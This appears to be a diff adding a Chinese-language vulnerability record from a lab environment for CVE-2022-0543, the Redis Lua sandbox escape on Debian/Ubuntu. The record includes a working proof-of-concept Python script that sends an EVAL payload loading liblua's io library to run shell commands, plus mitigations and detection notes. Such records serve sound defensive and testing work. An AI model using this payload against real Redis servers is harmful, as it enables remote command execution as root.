@@ -1,0 +1,68 @@
+id: VULN-2026-0003
+cve: CVE-2022-0543
+title: Redis Debian/Ubuntu 打包版 Lua 沙箱逃逸导致命令执行
+component: Redis（Debian/Ubuntu 打包版）
+affected_versions:
+- scheme: generic
+  introduced: 5.0.0
+  fixed: 6.0.16
+  exclude: []
+  note: 发行版修复版本以 Debian DSA-5081 / Ubuntu USN-5270-1 为准（未编造包版本号）
+cwe: CWE-862 权限缺失（Lua 沙箱逃逸，Debian/Ubuntu 打包问题）
+cvss_vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+cvss_score: 10.0
+severity: 严重
+attack_path:
+- 1. 网络可直达 Redis 6379 端口，确认无 requirepass 且未绑定回环
+- 2. 通过 EVAL 在 Lua 脚本内调用 package.loadlib 加载系统 liblua5.1.so.0 的 luaopen_io
+- 3. 用重建的 io 库执行 io.popen('id') 读回显，突破 Lua 沙箱取得命令执行（Scope 改变）
+preconditions:
+- 网络可达 6379 端口（本部署仅 127.0.0.1:<LAB_PORT>）
+- Redis 未启用 requirepass 且未绑定 127.0.0.1（默认配置）
+- 目标为 Debian/Ubuntu 打包版：发行版把 liblua 动态库暴露给 Lua 沙箱，EVAL 可用
+repro_steps:
+- cmd: redis-cli -h 127.0.0.1 -p <LAB_PORT> INFO server
+  expect: 返回 redis_version 等指纹信息，确认 EVAL 未被禁用
+- cmd: "python3 - <<'PY'\nimport socket\n\nhost, port = \"127.0.0.1\", <LAB_PORT>  # 端口由 labctl 分配后替换\nscript = (\n    \"\
+    local f=package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0','luaopen_io') \"\n    \"local io=f() local p=io.popen('id')\
+    \ local r=p:read('*a') p:close() return r\"\n)\nreq = f\"*3\\r\\n$4\\r\\nEVAL\\r\\n${len(script)}\\r\\n{script}\\r\\n$1\\\
+    r\\n0\\r\\n\"\nwith socket.create_connection((host, port), timeout=5) as sock:\n    sock.sendall(req.encode())\n    print(sock.recv(4096).decode(errors=\"\
+    replace\"))\nPY"
+  expect: 返回 uid=0(root) gid=0(root) 等命令输出（仅本地靶场）
+- cmd: redis-cli -h 127.0.0.1 -p <LAB_PORT> DBSIZE
+  expect: 0（EVAL 未写入任何 key，无需数据清理；确认端口随后由 lab down 释放）
+evidence:
+- path: evidence/VULN-2026-0003/20261026T132847Z/env.txt
+  sha256: 77d4f6a4fa234ece49a7f5308736723905cd79d576b22f2cab8c0e80edf1880a
+  ts: '2026-10-26T13:28:47.935Z'
+- path: evidence/VULN-2026-0003/20261026T132847Z/request.txt
+  sha256: 48cdc341be457a72e4a917f3bc14e99853e417d5cb90a479d318ca88c8598671
+  ts: '2026-10-26T13:28:47.935Z'
+- path: evidence/VULN-2026-0003/20261026T132847Z/command.txt
+  sha256: 4e5ba38244e1f7944d7e027d7e4090ec8ca9425add926091cea83bb8e023f9a4
+  ts: '2026-10-26T13:28:47.935Z'
+- path: evidence/VULN-2026-0003/20261026T132847Z/cleanup.txt
+  sha256: cbb4bb4907189b760a50b635ea35e4b6d3b11d21c900a7719248dcb28e5feafd
+  ts: '2026-10-26T13:28:47.936Z'
+fix:
+  patch_version: 升级发行版 redis 包：Debian DSA-5081 / Ubuntu USN-5270-1（以发行版公告为准）
+  config_mitigation:
+  - 禁止 Redis 暴露到网络：只绑定 127.0.0.1，防火墙仅放行必要来源
+  - 启用 requirepass 并禁用/重命名危险命令（rename-command EVAL ""）
+  - 以非 root 用户运行 Redis，缩小命令执行后的影响面
+  detection_rule: 检测模块 H-0001/N-0101（异常请求/流量：非业务 EVAL 与 Lua 动态库加载）
+references:
+- https://nvd.nist.gov/vuln/detail/CVE-2022-0543
+- https://www.debian.org/security/2022/dsa-5081
+- https://bugs.debian.org/1005787
+- https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce
+attack_technique: T1190
+lab:
+  kind: server
+  path: redis/CVE-2022-0543
+  ports:
+  - 6379
+status: verified
+owner: 靶场模块
+created_at: '2026-10-26T13:00:00Z'
+updated_at: '2026-10-26T13:28:47.936Z'
